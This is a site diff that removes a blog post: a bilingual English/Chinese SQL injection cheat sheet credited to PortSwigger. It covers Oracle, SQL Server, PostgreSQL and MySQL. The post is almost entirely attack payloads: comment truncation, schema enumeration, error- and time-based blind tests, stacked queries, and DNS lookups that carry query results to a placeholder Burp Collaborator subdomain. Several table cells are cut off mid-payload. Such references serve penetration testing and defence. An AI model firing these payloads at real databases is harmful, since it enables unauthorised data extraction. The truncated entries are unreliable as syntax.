-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
-<h1 id="String-concatenation-字符串连接"><a href="#String-concatenation-字符串连接" class="headerlink" title="String concatenation 字符串连接"></a>String concatenation 字符串连接</h1><p>You can concatenate together multiple strings to make a single string.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">`’foo’</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>&#39;foo&#39;+&#39;bar&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left">`’foo’</td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>&#39;foo&#39; &#39;bar&#39; [Note the space between the two strings]</code> <br> <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Comments-注释"><a href="#Comments-注释" class="headerlink" title="Comments 注释"></a>Comments 注释</h1><p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>--comment</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>#comment</code> <br><code>-- comment [Note the space after the double dash]</code> <br><code>/*comment*/</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Database-version-数据库版本"><a href="#Database-version-数据库版本" class="headerlink" title="Database version 数据库版本"></a>Database version 数据库版本</h1><p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>SELECT banner FROM v$version</code> <br><code>SELECT version FROM v$instance</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>SELECT @@version</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT version()</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT @@version</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Database-contents-数据库内容"><a href="#Database-contents-数据库内容" class="headerlink" title="Database contents 数据库内容"></a>Database contents 数据库内容</h1><p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Conditional-errors-条件错误"><a href="#Conditional-errors-条件错误" class="headerlink" title="Conditional errors 条件错误"></a>Conditional errors 条件错误</h1><p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Batched-or-stacked-queries-批量查询"><a href="#Batched-or-stacked-queries-批量查询" class="headerlink" title="Batched (or stacked) queries 批量查询"></a>Batched (or stacked) queries 批量查询</h1><p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>Does not support batched queries.</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>Does not support batched queries.</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Time-delays-时间延迟"><a href="#Time-delays-时间延迟" class="headerlink" title="Time delays 时间延迟"></a>Time delays 时间延迟</h1><p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT pg_sleep(10)</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT sleep(10)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Conditional-time-delays-有条件的时间延迟"><a href="#Conditional-time-delays-有条件的时间延迟" class="headerlink" title="Conditional time delays 有条件的时间延迟"></a>Conditional time delays 有条件的时间延迟</h1><p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN ‘a’</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,sleep(10),&#39;a&#39;)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="DNS-lookup-DNS查询"><a href="#DNS-lookup-DNS查询" class="headerlink" title="DNS lookup DNS查询"></a>DNS lookup DNS查询</h1><p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<code>SELECT extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code><br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<code>SELECT UTL_INADDR.get_host_address(&#39;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;)</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>exec master..xp_dirtree &#39;//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>copy (SELECT &#39;&#39;) to program &#39;nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left">The following techniques work on Windows only:<br><code>LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)</code><br><code>SELECT ... INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找"><a href="#DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找" class="headerlink" title="DNS lookup with data exfiltration 使用数据泄露进行DNS查找"></a>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</h1><p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">`SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?>&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM “http://‘</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&#39;)</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left">create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := ‘copy (SELECT ‘’’’) to program ‘’nslookup ‘</td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left">The following technique works on Windows only:<code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>SQL注入在不同数据库的表现,可表现在这些方面:</p>
-<ul>
-<li>String concatenation 字符串连接</li>
-<li>Comments 注释</li>
-<li>Database version 数据库版本的查询</li>
-<li>Database contents 数据库内容的查询</li>
-<li>Conditional errors 条件错误</li>
-<li>Batched (or stacked) queries 批量查询</li>
-<li>Time delays 时间延迟</li>
-<li>Conditional time delays 有条件的时间延迟</li>
-<li>DNS lookup DNS查询<br>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</li>
-</ul>
-<hr>
-<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
-<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">SQL injection cheat sheet</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2406,7 +2214,7 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">45</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
